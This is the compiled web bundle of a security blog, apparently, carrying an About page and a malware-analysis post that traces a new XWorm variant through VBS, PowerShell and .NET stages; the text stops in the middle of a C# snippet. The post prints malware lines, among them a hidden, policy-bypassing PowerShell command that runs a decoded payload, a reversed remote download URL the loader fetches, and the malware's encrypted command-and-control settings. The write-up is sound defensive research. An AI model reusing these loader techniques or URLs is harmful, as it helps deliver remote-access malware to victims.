import { c as create_ssr_component, v as validate_component, b as escape, a as add_attribute } from "./ssr.js";
import { s as site } from "./site.js";
import { H as Head, P as Post_card, F as Footer } from "./footer.js";
const Post_container = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  let { post } = $$props;
  if ($$props.post === void 0 && $$bindings.post && post !== void 0)
    $$bindings.post(post);
  return `${validate_component(Head, "Head").$$render($$result, { post }, {}, {})} <div class="flex flex-col flex-nowrap justify-center xl:flex-row xl:flex-wrap"><div class="flex-1 w-full order-first ease-out transform mx-auto xl:mr-0 xl:ml-0">${``}</div> <div class="flex-1 w-full xl:order-last ease-out transform mx-auto xl:ml-0 xl:mr-0">${``}</div> <div class="flex-none w-full max-w-screen-md mx-auto xl:mx-0">${validate_component(Post_card, "Card").$$render($$result, { post }, {}, {
    default: () => {
      return `${slots.default ? slots.default({}) : ``}`;
    }
  })} ${validate_component(Footer, "Footer").$$render($$result, { sticky: true }, {}, {})}</div></div>`;
});
const Post_layout = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  let { path } = $$props;
  let { slug } = $$props;
  let { toc } = $$props;
  let { created } = $$props;
  let { updated } = $$props;
  let { published } = $$props;
  let { summary } = $$props;
  let { tags } = $$props;
  let { flags } = $$props;
  let { title } = $$props;
  let { image } = $$props;
  let { in_reply_to } = $$props;
  let fm = {
    path,
    slug,
    toc,
    created,
    updated,
    published,
    summary,
    tags,
    flags,
    title,
    image,
    in_reply_to
  };
  let post = { type: typeOfPost(fm), ...fm };
  if ($$props.path === void 0 && $$bindings.path && path !== void 0)
    $$bindings.path(path);
  if ($$props.slug === void 0 && $$bindings.slug && slug !== void 0)
    $$bindings.slug(slug);
  if ($$props.toc === void 0 && $$bindings.toc && toc !== void 0)
    $$bindings.toc(toc);
  if ($$props.created === void 0 && $$bindings.created && created !== void 0)
    $$bindings.created(created);
  if ($$props.updated === void 0 && $$bindings.updated && updated !== void 0)
    $$bindings.updated(updated);
  if ($$props.published === void 0 && $$bindings.published && published !== void 0)
    $$bindings.published(published);
  if ($$props.summary === void 0 && $$bindings.summary && summary !== void 0)
    $$bindings.summary(summary);
  if ($$props.tags === void 0 && $$bindings.tags && tags !== void 0)
    $$bindings.tags(tags);
  if ($$props.flags === void 0 && $$bindings.flags && flags !== void 0)
    $$bindings.flags(flags);
  if ($$props.title === void 0 && $$bindings.title && title !== void 0)
    $$bindings.title(title);
  if ($$props.image === void 0 && $$bindings.image && image !== void 0)
    $$bindings.image(image);
  if ($$props.in_reply_to === void 0 && $$bindings.in_reply_to && in_reply_to !== void 0)
    $$bindings.in_reply_to(in_reply_to);
  return `${validate_component(Post_container, "Container").$$render($$result, { post }, {}, {
    default: () => {
      return `${slots.default ? slots.default({}) : ``}`;
    }
  })}`;
});
const gist_svelte_svelte_type_style_lang = "";
const toot_svelte_svelte_type_style_lang = "";
const tweet_svelte_svelte_type_style_lang = "";
const Profile = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  let { avatar } = $$props;
  let { name } = $$props;
  let { subname } = $$props;
  let { bio } = $$props;
  if ($$props.avatar === void 0 && $$bindings.avatar && avatar !== void 0)
    $$bindings.avatar(avatar);
  if ($$props.name === void 0 && $$bindings.name && name !== void 0)
    $$bindings.name(name);
  if ($$props.subname === void 0 && $$bindings.subname && subname !== void 0)
    $$bindings.subname(subname);
  if ($$props.bio === void 0 && $$bindings.bio && bio !== void 0)
    $$bindings.bio(bio);
  return `<div class="relative w-auto min-h-48 rounded-box overflow-hidden bg-gradient-to-b from-primary to-secondary text-primary-content transition-shadow duration-200 shadow-xl hover:shadow-2xl p-4 md:p-8 my-4"><div class="absolute -top-4 opacity-10 text-[12rem] text-neutral leading-tight rotate-[30deg]">${escape(name ?? site.author.name)}</div> <div class="avatar mb-4"><div class="rounded-full border-2 border-white shadow-xl w-16 h-16"><img class="hover:rotate-[360deg] transition-transform duration-1000 ease-in-out m-0"${add_attribute("src", avatar ?? site.author.avatar, 0)}${add_attribute("alt", name ?? site.author.name, 0)} loading="lazy" decoding="async"></div></div> ${subname ? `<div class="opacity-50">${escape(subname)}</div>` : ``} <div class="text-2xl mb-2">${escape(name ?? site.author.name)}</div> ${bio || site.author.bio ? `<div><!-- HTML_TAG_START -->${bio ?? site.author.bio}<!-- HTML_TAG_END --></div>` : ``} ${slots.default ? slots.default({}) : ``}</div>`;
});
const _page_svelte_md_svelte_type_style_lang$1 = "";
const css$1 = {
  code: "img.svelte-e0dhad{display:block;margin-left:auto;margin-right:auto}",
  map: null
};
const metadata$1 = {
  "title": "About",
  "flags": ["unlisted"],
  "created": "2024-02-17T16:39:09.362Z",
  "updated": "2024-02-17T16:39:09.362Z",
  "images": [],
  "tags": [],
  "slug": "/about/+page.svelte.md",
  "path": "/about",
  "toc": false
};
const Page_svelte$1 = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  $$result.css.add(css$1);
  return `${validate_component(Post_layout, "Layout_MDSVEX_DEFAULT").$$render($$result, Object.assign({}, $$props, metadata$1), {}, {
    default: () => {
      return `<img src="/assets/kryptoenix.png" alt="image" class="svelte-e0dhad"> <p data-svelte-h="svelte-1a5jo27">I started this blog to share insights gained from the incredible community of researchers. We’ll mainly dive into cybersecurity, exploring the ins and outs of complex technologies and their impact. Stick around for some fascinating topics!</p> ${validate_component(Profile, "Profile").$$render($$result, { subname: "KE", bio: "" }, {}, {
        default: () => {
          return `<div class="flex flex-col md:flex-row gap-4 mt-4 justify-center" data-svelte-h="svelte-l8738u"><a href="https://t.me/kwaabot" rel="noopener external" target="_blank" class="flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#26a5e4] hover:bg-[#0088cc] flex items-center"><span class="i-simple-icons-telegram absolute w-16 h-16 left-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">@kryptoenix</span></a> <a href="https://discord.com/users/349550824202043392" rel="noopener external" target="_blank" class="flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#5865f2] hover:bg-[#7983f5] flex items-center"><span class="i-simple-icons-discord absolute w-16 h-16 right-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">Kryptoenix#1929</span></a> <a href="https://t.me/kwaabot" rel="noopener external" target="_blank" class="flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#424040] hover:bg-[#757272] flex items-center"><span class="i-simple-icons-telegram absolute w-16 h-16 left-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">📂 Kryptoenix</span></a></div>`;
        }
      })}`;
    }
  })}`;
});
const __vite_glob_0_0 = /* @__PURE__ */ Object.freeze(/* @__PURE__ */ Object.defineProperty({
  __proto__: null,
  default: Page_svelte$1,
  metadata: metadata$1
}, Symbol.toStringTag, { value: "Module" }));
const _page_svelte_md_svelte_type_style_lang = "";
const css = {
  code: "img.svelte-e0dhad{display:block;margin-left:auto;margin-right:auto}",
  map: null
};
const metadata = {
  "title": "Hunting in the wild - XWorm new variant",
  "alt": "Kryptoenix",
  "created": "2024-02-17T00:00:00.000Z",
  "updated": "2024-02-17T00:00:00.000Z",
  "summary": "A fresh iteration of XWorm emerges, masquerading as an automation project within nefarious email attachments.",
  "tags": ["malware analysis", "xworm"],
  "image": "/assets/image1.jpeg",
  "images": [],
  "slug": "/first-post/+page.svelte.md",
  "path": "/first-post",
  "toc": [
    {
      "depth": 2,
      "title": "Introduction",
      "slug": "introduction"
    },
    {
      "depth": 2,
      "title": "First sign of malicious code",
      "slug": "first-sign-of-malicious-code"
    },
    {
      "depth": 2,
      "title": "New language, old friend",
      "slug": "new-language-old-friend"
    },
    {
      "depth": 2,
      "title": "Decompiling the culprit",
      "slug": "decompiling-the-culprit"
    },
    {
      "depth": 2,
      "title": "Searching for keys?",
      "slug": "searching-for-keys"
    },
    {
      "depth": 2,
      "title": "Conclusion",
      "slug": "conclusion"
    }
  ]
};
const Page_svelte = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  $$result.css.add(css);
  return `${validate_component(Post_layout, "Layout_MDSVEX_DEFAULT").$$render($$result, Object.assign({}, $$props, metadata), {}, {
    default: () => {
      return `<h2 id="introduction" data-svelte-h="svelte-ccveyw"><a href="#introduction">Introduction</a></h2> <p data-svelte-h="svelte-l0ad4k">Hello there, welcome to the board! I’m openning this blog series with an exciting topic: malware analysis. I will start by collecting pieces for our puzzle and continue to combine them until, by the end of journey, each piece contributes to the bigger picture.</p> <p data-svelte-h="svelte-1onww4q"><a href="https://bazaar.abuse.ch/" rel="nofollow noopener noreferrer external" target="_blank">MalwareBazaar</a> website provides a large database of malware samples, where researchers can report different files which might seem suspicious. Today, while I was searching for potential subject for analysis, I stumbled upon an interesting archive. This was found as part of an email attachment in a malware campaign. The sample can be found <a href="https://bazaar.abuse.ch/sample/76fbfcb8754ba7e23c855a71db83aae75c106d84e106330b772cf3a28a440993/#comments" rel="nofollow noopener noreferrer external" target="_blank">here</a>.</p> <h2 id="first-sign-of-malicious-code" data-svelte-h="svelte-143uk5j"><a href="#first-sign-of-malicious-code">First sign of malicious code</a></h2> <p data-svelte-h="svelte-1qw7k5v">The initial archive contains a disk image (<code>.img</code>) file, a known format for executing code once the victim clicks the file. If this is not yet suspicious, let’s inspect for visible signs that might indicate unwanted behaviour such as download links. For this step, I used a powerful utiliy called <code>binwalk</code>, capable of extracting bundled files.</p> <!-- HTML_TAG_START -->${`<pre class="shiki material-default with-title" style="background-color: #263238; color: #EEFFFF" shell="true" title="extract files from disk image"><div class='code-title'>extract files from disk image</div><div class="language-id">shell</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">binwalk -e Damaged_item.img</span></div></code></div></pre>`}<!-- HTML_TAG_END --> <p data-svelte-h="svelte-1h3vs2a">Now, a new folder <code>iso-root</code> contains a friendly-looking <code>VBS</code> script.</p> <img src="damaged-itemvbs.png" alt="image" class="svelte-e0dhad"> <p data-svelte-h="svelte-gqvjlb">The script simply tries to download the content found at a Pastebin link and then execute the fetched code using <code>ExecuteGlobal</code> function. Good news, the link was suspended and therefore, the following code cannot be executed anymore, preventing victims from infection. Defenders and Pastebin support did great work in such a short period of time (less than 18h :)). Fortunately, I was able to extract the next stage of <code>VBS</code> code (the code from Pastebin link) before removal. Let’s analyse it!</p> <img src="fetched-vbs.png" alt="image" class="svelte-e0dhad"> <p data-svelte-h="svelte-71phqk">We are dealing with some obfuscation, so it would be faster if we can find a way to print the final code (after deobfuscation, but before execution). This way, we can get a clear understanding of what’s under the hood. Some hints suggest that deobfuscated code is <code>powershell</code>. The plan is to write the final code to a powershell script.</p> <!-- HTML_TAG_START -->${`<pre class="shiki material-default with-title" style="background-color: #263238; color: #EEFFFF" js="true" title="code appended to the end of obfuscated VBS"><div class='code-title'>code appended to the end of obfuscated VBS</div><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #FFCB6B">Set</span><span style="color: #EEFFFF"> fso </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">CreateObject</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Scripting.FileSystemObject</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">)</span></div><div class='line'><span style="color: #FFCB6B">Set</span><span style="color: #EEFFFF"> outputFile </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> fso</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">CreateTextFile</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">deobfuscated.ps1</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> True)</span></div><div class='line'><span style="color: #EEFFFF">outputFile</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">WriteLine durguete</span></div></code></div></pre>`}<!-- HTML_TAG_END --> <p data-svelte-h="svelte-rqfhvz">Once we append this code and execute the whole script, <code>deobfuscated.ps1</code> file will help us in the next stage.</p> <h2 id="new-language-old-friend" data-svelte-h="svelte-1wjvziz"><a href="#new-language-old-friend">New language, old friend</a></h2> <p data-svelte-h="svelte-1r2u4qj">It becomes clear that attacker tries to hide as much as possible by adding polimorphic code, with many layers of obfuscation. The recovered <code>PS1</code> script replaces some substrings in <code>$codigo</code> string, decodes it in <code>base64</code> and executes the code using a classic powershell technique.</p> <!-- HTML_TAG_START -->${`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" powershell="true"><div class="language-id">powershell</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">powershell </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">command </span><span style="color: #89DDFF">"$</span><span style="color: #EEFFFF">codigo</span><span style="color: #C3E88D"> = 'ZgB1DgTreG4DgTreYwB0DgTreGkDgTrebw &lt;-- stripped --&gt; eKQB9DgTreCDgTreDgTrefQDgTre=';</span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">oWjuxd</span><span style="color: #C3E88D"> = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">codigo</span><span style="color: #C3E88D">.replace('DgTre','A') ));powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">OWjuxD</span><span style="color: #89DDFF">"</span></div></code></div></pre>`}<!-- HTML_TAG_END --> <p data-svelte-h="svelte-5hhyp2">After decoding, we are left with another powershell script. It is more verbose than the previous one.</p> <img src="deobfs2.png" alt="image" class="svelte-e0dhad"> <p data-svelte-h="svelte-ge3kz">Let’s break it into smaller pieces. The variable <code>@links</code> contains links used by <code>DownloadDataFromLinks</code> function to download an image (chosen at random). Now comes the interesting part. The actual downloaded image contain an embedded <code>.NET</code> assembly (<code>$loadedAssembly</code> and <code>GetMethod</code> are clear signs that we are dealing with .NET code). I will adapt this PS1 script such that, after downloading and decoding are complete, variable <code>$commandBytes</code> will write its content to an output file <code>malware-net</code>. Below is a small snippet of what’s being changed in the original code:</p> <!-- HTML_TAG_START -->${`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" js="true"><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> ($startIndex </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">ge </span><span style="color: #F78C6C">0</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">and $endIndex </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">gt $startIndex) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$startIndex</span><span style="color: #F07178"> </span><span style="color: #89DDFF">+=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$startFlag</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Length</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$base64Length</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$endIndex</span><span style="color: #F07178"> </span><span style="color: #89DDFF">-</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$startIndex</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$base64Command</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$imageText</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Substring</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">$startIndex</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">$base64Length</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$commandBytes</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> [</span><span style="color: #EEFFFF">System</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Convert</span><span style="color: #F07178">]::</span><span style="color: #82AAFF">FromBase64String</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">$base64Command</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">$commandBytes</span><span style="color: #F07178"> </span><span style="color: #89DDFF">|</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">Out</span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">File</span><span style="color: #F07178"> </span><span style="color: #89DDFF">-</span><span style="color: #EEFFFF">FilePath</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">malware-net</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">            &#125;</span></div></code></div></pre>`}<!-- HTML_TAG_END --> <p data-svelte-h="svelte-pbeqsv">Additional decoding is required in order to extract the assembly properly. For that, CyberChef will simplify things a lot using <a href="https://gchq.github.io/CyberChef/#recipe=Decode_text('UTF-16LE%2520(1200)')Find_/_Replace(%257B'option':'Regex','string':'%255C%255Cr%255C%255Cn'%257D,'%2520',true,false,true,false)From_Decimal('Space',false)" rel="nofollow noopener noreferrer external" target="_blank">this recipe</a>.</p> <h2 id="decompiling-the-culprit" data-svelte-h="svelte-1akbftj"><a href="#decompiling-the-culprit">Decompiling the culprit</a></h2> <p data-svelte-h="svelte-12llahp">We take a look at the first bytes and notice that they represent the file signature for an executable <code>.EXE</code>. Inspect it’s properties to gain new insights.</p> <img src="malware.png" alt="image" class="svelte-e0dhad"> <p data-svelte-h="svelte-y4xqpq">Seems like this campaign is addressed to spanish speaking victims. Maybe it was sent to employees of some companies since the description is related to <code>Automation project</code>?</p> <p data-svelte-h="svelte-1fc9qni">So far, the executable won’t pose dificulties because it’s written in an intepreted language, making it easier to retrieve the original code. <a href="https://github.com/icsharpcode/ILSpy" rel="nofollow noopener noreferrer external" target="_blank">ILSpy</a> is a great tool for decompiling .NET binaries, suitable for our purpose. (Open the image in a new tab if you don’t see the code)</p> <img src="decompiled1.png" alt="image" class="svelte-e0dhad"> <p data-svelte-h="svelte-23ztk8">This is one functionality of the binary through which the malware tries to gain persistence by abusing widely-known start-up registry <code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>. Other functionalities found include: using D/Invoke syscall, creating new processes under the path of <code>cmd.exe</code> and another one related to .NET framework.</p> <img src="malhelper.png" alt="image" class="svelte-e0dhad"> <p data-svelte-h="svelte-yzv1ld">Remember that in previously discussed powershell script, a method was invoked on this assembly, <code>VAI</code>:</p> <!-- HTML_TAG_START -->${`<pre class="shiki material-default with-title" style="background-color: #263238; color: #EEFFFF" js="true" title="snipped from second powershell script"><div class='code-title'>snipped from second powershell script</div><div class="language-id">js</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">$method </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> $type</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">GetMethod</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">VAI</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Invoke</span><span style="color: #EEFFFF">($null</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> [object[]](</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">441ae23bb6fe-0269-74a4-c2ae-4ebc2dab=nekot&aidem=tla?txt.102061mrowxnhoj/o/moc.topsppa.64038-metsys-eciovni/b/0v/moc.sipaelgoog.egarotsesaberif//:sptth</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">1</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">C:</span><span style="color: #EEFFFF">P</span><span style="color: #C3E88D">rogramData</span><span style="color: #EEFFFF">'</span><span style="color: #C3E88D"> , </span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">Name </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">,</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> AddInProcess32 </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">,</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">))&#125; &#125;</span></div></code></div></pre>`}<!-- HTML_TAG_END --> <p data-svelte-h="svelte-v92x8g">In ILSpy, we can see that <code>VAI</code> is responsible for reversing and downloading the file from link. After that, the file obtained is reversed and decoded in base64.</p> <img src="toolsmal.png" alt="image" class="svelte-e0dhad"> <h2 id="searching-for-keys" data-svelte-h="svelte-bjozqq"><a href="#searching-for-keys">Searching for keys?</a></h2> <p data-svelte-h="svelte-e5k1l8">This hunting brought us to a new .NET binary. We can confirm its signature, in Kali:</p> <!-- HTML_TAG_START -->${`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line highlight'><span style="color: #89DDFF">[</span><span style="color: #EEFFFF">kali@kali -</span><span style="color: #89DDFF">]</span><span style="color: #EEFFFF">$ file mal2.exe</span></div><div class='line dim'><span style="color: #EEFFFF">mal2.exe: PE32 executable </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">GUI</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> Intel 80386 Mono/.Net assembly, </span><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> MS Windows, 3 sections</span></div></code></div></pre>`}<!-- HTML_TAG_END --> <p data-svelte-h="svelte-1dnjm7i">Through decompilation, we find a vast number of functions related to malitious behaviour. In <code>Main</code> function, some variables are decrypted using <code>AES</code> in <code>ECB mode</code>. These “setting” variables will be used later in establishing connections between victim and attacker’s C&amp;C infrastructure.</p> <img src="worm1.png" alt="image" class="svelte-e0dhad"> <img src="worm2.png" alt="image" class="svelte-e0dhad"> <p data-svelte-h="svelte-y5a8fg">Based on the known values of encrypted strings and encoded key, it is possible to recover the plaintext values using a similar decryption routine used in encryption:</p> <!-- HTML_TAG_START -->${`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" csharp="true"><div class="language-id">csharp</div><div class='code-container'><code><div class='line'><span style="color: #F78C6C">using</span><span style="color: #EEFFFF"> System</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F78C6C">using</span><span style="color: #EEFFFF"> System.Security.Cryptography</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F78C6C">using</span><span style="color: #EEFFFF"> System.Text</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Settings</span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Host</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">8wEbreuCNstcX+VMVrMtN79nabenssi23ZA2UwI0sBw=</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Port</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">NHj6D/XmlURhrDZN4bCpqA==</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">KEY</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">tGwHQrFuqEZ9E5eQxvPElQ==</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">SPL</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">A6XU+/uh3DsQy74ojVhAhQ==</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">int</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Sleep</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">3</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">USBNM</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">k6tUhyBB8c9OnCp0im2vjw==</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Mutex</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">mrkh245537gVoEKF</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">AlgorithmAES</span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">input</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #FFCB6B">RijndaelManaged</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">rijndaelManaged</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">new</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">RijndaelManaged</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #FFCB6B">MD5CryptoServiceProvider</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">mD5CryptoServiceProvider</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">new</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">MD5CryptoServiceProvider</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">array</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">new</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">byte[</span><span style="color: #F78C6C">32</span><span style="color: #89DDFF">];</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">sourceArray</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> mD5CryptoServiceProvider</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">ComputeHash</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">UTF8SB</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: 